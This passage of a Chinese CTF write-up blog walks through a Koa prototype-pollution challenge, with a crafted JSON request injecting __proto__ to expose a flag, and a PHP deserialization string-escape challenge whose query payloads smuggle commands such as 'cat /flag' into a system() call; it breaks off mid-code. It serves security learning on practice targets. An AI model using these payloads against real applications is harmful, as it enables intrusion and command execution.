data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> dst <span class=\"token operator\">&amp;&amp;</span> key <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> src<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">return</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\">// 处理 POST 请求到 \"/submit\" 端点</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/submit\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">ctx</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token comment\">// 检查内容类型是否为 \"application/json\"</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">[</span><span class=\"token string\">\"content-type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Content-Type 必须为 application/json\"</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token comment\">// 获取请求体中的原始 JSON 数据，如果为空则默认为一个空对象</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">const</span> jsonText <span class=\"token operator\">=</span> ctx<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>rawBody <span class=\"token operator\">||</span> <span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        <span class=\"token comment\">// 解析 JSON 数据</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>jsonText<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token comment\">// 检查参数的有效性</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"contact\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">\"string\"</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">typeof</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"reason\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">\"string\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>                <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Invalid parameter\"</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"contact\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"reason\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            <span class=\"token keyword\">return</span> ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>                <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Parameters contact and reason cannot be empty\"</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token comment\">// 定义默认参数</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">const</span> <span class=\"token constant\">DEFAULT</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            <span class=\"token literal-property property\">date</span><span class=\"token operator\">:</span> <span class=\"token string\">\"unknown\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token literal-property property\">place</span><span class=\"token operator\">:</span> <span class=\"token string\">\"unknown\"</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token comment\">// 调用插入到数据库的异步函数，将数据插入到数据库</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">insert2db</span><span class=\"token punctuation\">(</span><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token comment\">// 发送包含成功响应和插入的数据的响应</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>            <span class=\"token literal-property property\">data</span><span class=\"token operator\">:</span> result</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token comment\">// 处理错误并发送错误响应</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        ctx<span class=\"token punctuation\">.</span>body <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>            <span class=\"token literal-property property\">status</span><span class=\"token operator\">:</span> <span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Internal Server Error\"</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token comment\">// 导出该路由以供其他模块使用</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> router<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以在这里看到注入点：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">merge</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">dst<span class=\"token punctuation\">,</span> src</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> dst <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">typeof</span> src <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token keyword\">in</span> dst <span class=\"token operator\">&amp;&amp;</span> key <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            dst<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> src<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 调用插入到数据库的异步函数，将数据插入到数据库</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">insert2db</span><span class=\"token punctuation\">(</span><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>只要考虑注入 <code>data['__proto__']['min_public_time']</code>  的值即可</p>\n<p>构造 payload:</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/submit</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/json</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">*/*</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://ea7a79c9-28eb-4d7c-b50c-08347f75dffa.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">81</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token application-json\"></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"date\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"12\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"place\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"12\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"contact\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"21\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"reason\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"12\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"timestamp\"</span><span class=\"token operator\">:</span><span class=\"token number\">1699615187967</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"__proto__\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"min_public_time\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"1001-01-01\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>直接让其等于 1001-01-01, 再访问 /info/ 界面就可以看到：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#123;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            \"wishid\": \"2ma2TNsiQRmchxySEYefyRjm\",</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            \"date\": \"2021-09-27\",</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            \"place\": \"学園都市\",</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            \"contact\": \"御坂美琴\",</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            \"reason\": \"海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag&#123;89310f17-3405-49bb-89ef-c41dcffc0332&#125;です\",</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            \"timestamp\": 1190726040548</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        &#125;,</pre></td></tr></table></figure><p>验证一下时间戳：1190726040  2007-09-25 21:14:00</p>\n<p>和理想一样。</p>\n<h2 id=\"week4\"><a class=\"anchor\" href=\"#week4\">#</a> Week4</h2>\n<h3 id=\"逃\"><a class=\"anchor\" href=\"#逃\">#</a> 逃</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"bad\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"good\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">GetFlag</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"whoami\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">GetFlag</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>典型的 php 反序列化字符串逃逸，可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDcxMzU3MDY=\">PHP 反序列化字符逃逸详解</span></p>\n<p>这里直接借用官方 wp 的解释了，讲的真的很好！</p>\n<ul>\n<li><strong>解题步骤</strong></li>\n</ul>\n<p>本题考查字符变长的情况，主要关注点在于：</p>\n<blockquote>\n<p>function waf($str){</p>\n<p>​    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);</p>\n<p>}</p>\n</blockquote>\n<p>这里我们可控的只有 key 的值，因此需要通过这里的字符长度的变化来修改序列化字符串，从而实现对于 cmd 值的控制。</p>\n<p>举个栗子，在本题中如果我们传入 badbad，正常输出的序列化字符串如下：</p>\n<blockquote s:3:key;s:6:badbad;s:3:cmd;s:6:whoami;=\"\">\n<p>O:7:&quot;GetFlag&quot;:2:</p>\n</blockquote>\n<p>但是经过 waf 函数的替换后实际上传递给 unserialize 函数的字符串变成了：</p>\n<blockquote s:3:key;s:6:goodgood;s:3:cmd;s:6:whoami;=\"\">\n<p>O:7:&quot;GetFlag&quot;:2:</p>\n</blockquote>\n<p>注意这里的</p>\n<p>s:6:&quot;goodgood&quot;;</p>\n<p>PHP 在扫描序列化字符串的时候会根据字符串长度进行扫描，也就是此时只会扫描到 goodgo</p>\n<p>而多出的 od&quot; 字符就会被抛弃，当然，此时的序列化字符串也因为这个原因变得不合法，因此我们需要利用这个特点来构造出合法的字符串去修改 cmd 的值。</p>\n<p>例如我们想要构造的是：</p>\n<blockquote>\n<p>O:7:&quot;GetFlag&quot;:2:{s:3:&quot;key&quot;;s:N:&quot;N 个长度的字符串&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;}</p>\n</blockquote>\n<p>实际上我们输入的是：</p>\n<p>N 个长度的字符串 &quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p>\n<p>也就是说</p>\n<blockquote>\n<p>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p>\n</blockquote>\n<p>就是我们想要逃逸出去的字符，我们希望 N 个长度的字符串的长度恰好到双引号之前，此时我们的输入就会作为合法的序列化数据进行处理，后续原本的 &quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;} 就会被丢弃。</p>\n<p>我们需要插入的字符总共有 22 位，因此需要逃逸出 22 个字符，一个 bad 可以逃逸出 1 个字符，因此需要 22 个 bad，构造 Exp 如下：</p>\n<blockquote>\n<p>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p>\n</blockquote>\n<p>此时实际上的反序列化数据是：</p>\n<blockquote>\n<p>O:7:&quot;GetFlag&quot;:2:{s:3:&quot;key&quot;;s:88:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;}</p>\n</blockquote>\n<p>good 的长度正好为 88，而 &quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;} 这一段数据就会被抛弃，由此完成了对于 cmd 值的修改。</p>\n<p>顺着这个思路只需要计算需要逃逸的字符数量即可：</p>\n<blockquote>\n<p>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;}</p>\n</blockquote>\n<h3 id=\"more-fast\"><a class=\"anchor\" href=\"#more-fast\">#</a> More Fast</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Start</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$errMsg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">errMsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pwn</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$obj</span><span class=\"token 